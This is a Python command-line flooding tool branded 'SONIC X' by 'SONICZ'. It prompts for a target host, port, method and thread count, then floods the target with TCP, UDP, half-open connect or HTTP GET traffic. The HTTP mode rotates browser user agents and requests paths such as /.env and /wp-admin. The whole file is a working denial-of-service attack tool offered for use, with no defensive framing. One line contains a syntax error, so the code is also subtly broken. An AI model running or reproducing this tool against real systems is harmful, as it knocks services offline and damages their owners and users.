#!/usr/bin/env python3
import socket, threading, time, os, sys, random, re

B = r"""
███████╗ ██████╗ ███╗   ██╗██╗ ██████╗     ██╗  ██╗
██╔════╝██╔═══██╗████╗  ██║██║██╔════╝     ╚██╗██╔╝
███████╗██║   ██║██╔██╗ ██║██║██║  ███╗     ╚███╔╝
╚════██║██║   ██║██║╚██╗██║██║██║   ██║     ██╔██╗
███████║╚██████╔╝██║ ╚████║██║╚██████╔╝    ██╔╝ ██╗
╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝ ╚═════╝     ╚═╝  ╚═╝
"""

r = False; t = []; p = 0; lk = threading.Lock(); st = threading.Event()

M = {
    "1": ("TCP",      lambda ip,port:_tc(ip,port)),
    "2": ("UDP",      lambda ip,port:_ud(ip,port)),
    "3": ("SYN",      lambda ip,port:_sy(ip,port)),
    "4": ("HTTP",     lambda ip,port:_ht(ip,port)),
    "5": ("MIXED",    lambda ip,port:_mx(ip,port))
}

def _tc(ip,port):
    global p
    while not st.is_set():
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(1)
            s.connect((ip,port)); s.send(b"GET / HTTP/1.1\r\nHost: "+ip.encode()+b"\r\n\r\n")
            with lk: p+=1; s.close()
        except: pass

def _ud(ip,port):
    global p
    while not st.is_set():
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.sendto(random._urandom(random.randint(512,2048)),(ip,port))
            with lk: p+=1; s.close()
        except: pass

def _sy(ip,port):
    global p
    while not st.is_set():
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(0.1)
            s.connect_ex((ip,port)); with lk: p+=1; s.close()
        except: pass

def _ht(ip,port):
    global p
    u=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.2210.91"]
    pa=["/","/index.php","/wp-admin/","/login","/api","/admin","/config","/.env","/backup","/xmlrpc.php","/wp-login.php","/server-status","/phpinfo.php","/debug","/robots.txt","/sitemap.xml"]
    while not st.is_set():
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.settimeout(2)
            s.connect((ip,port))
            s.send(f"GET {random.choice(pa)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(u)}\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n".encode())
            with lk: p+=1; s.close()
        except: pass

def _mx(ip,port):
    global p
    fs=[_tc,_ud,_sy,_ht]
    while not st.is_set():
        try: random.choice(fs)(ip,port)
        except: pass

def ss():
    while not st.is_set():
        time.sleep(1)
        with lk:
            n=p; p=0
        print(f"\r  [+] {n} pkts/s",end="",flush=True)

def go():
    global r,t,st,p
    if r: print("  [!] Already running"); return
    r=True; st.clear(); p=0; t=[]
    os.system("cls" if os.name=="nt" else "clear")
    print(B)
    ip=input("  Target IP/URL: ").strip()
    ip=re.sub(r'https?://','',ip).split('/')[0].split(':')[0]
    try: ip=socket.gethostbyname(ip)
    except: print("  [!] Invalid target"); return
    port=int(input("  Port: ") or 80)
    print("\n  Methods:\n    1=TCP  2=UDP  3=SYN  4=HTTP  5=MIXED")
    mt=input("  Method: ").strip() or "5"
    th=int(input("  Threads: ") or 100)
    nm,fn=M.get(mt,("MIXED",_mx))
    print(f"\n  [+] {ip}:{port} | {nm} | {th} threads\n")
    threading.Thread(target=ss,daemon=True).start()
    for _ in range(th):
        thrd=threading.Thread(target=fn,args=(ip,port),daemon=True)
        thrd.start(); t.append(thrd)
    print("  Type: stop | menu | about | exit\n")

def stp():
    global r
    if not r: return
    st.set(); time.sleep(1); r=False; t.clear()
    print("\r  [+] Stopped.             ")

def ab():
    print("\n  MADE BY SONICZ")
    print("  https://youtube.com/@sonicz-dev?si=gYlCjUugPIICIUn_\n")

def mn():
    print("\n  Commands: run | stop | menu | about | exit\n")

def main():
    os.system("cls" if os.name=="nt" else "clear")
    print(B)
    mn()
    while True:
        try:
            c=input("  > ").strip().lower()
            if c=="run": go()
            elif c=="stop": stp()
            elif c=="menu": mn()
            elif c=="about": ab()
            elif c=="exit": stp(); break
            else: print("  [?] run | stop | menu | about | exit")
        except KeyboardInterrupt: stp(); break
    print("  Bye.")

if __name__=="__main__": main()
